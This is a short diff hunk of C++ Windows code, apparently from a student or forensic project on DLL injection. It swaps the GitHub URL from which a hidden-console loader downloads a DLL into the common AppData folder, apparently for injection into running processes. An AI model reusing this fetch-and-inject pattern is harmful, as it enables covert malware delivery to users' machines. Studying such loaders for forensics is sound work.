@@ -29,7 +29,7 @@ std::vector<DWORD> getProcesses()
 int main(int argc, const char* argv[])
 {
 	ShowWindow(GetConsoleWindow(), NULL);
-	const CHAR url[] = "https://github.com/jjeongyuni00/Forensic-Project/blob/main/dll_injection/test/Project2.dll?raw=true"; // replace with your url
+	const CHAR url[] = "https://github.com/bsbae-git/Team-Project/blob/main/Team-Project-main/dll_injection/dll_inject.dll?raw=true"; // replace with your url
 	char path[MAX_PATH];
 	SHGetFolderPathA(NULL, CSIDL_COMMON_APPDATA, NULL, 0, path);
 	std::string filePath = path;
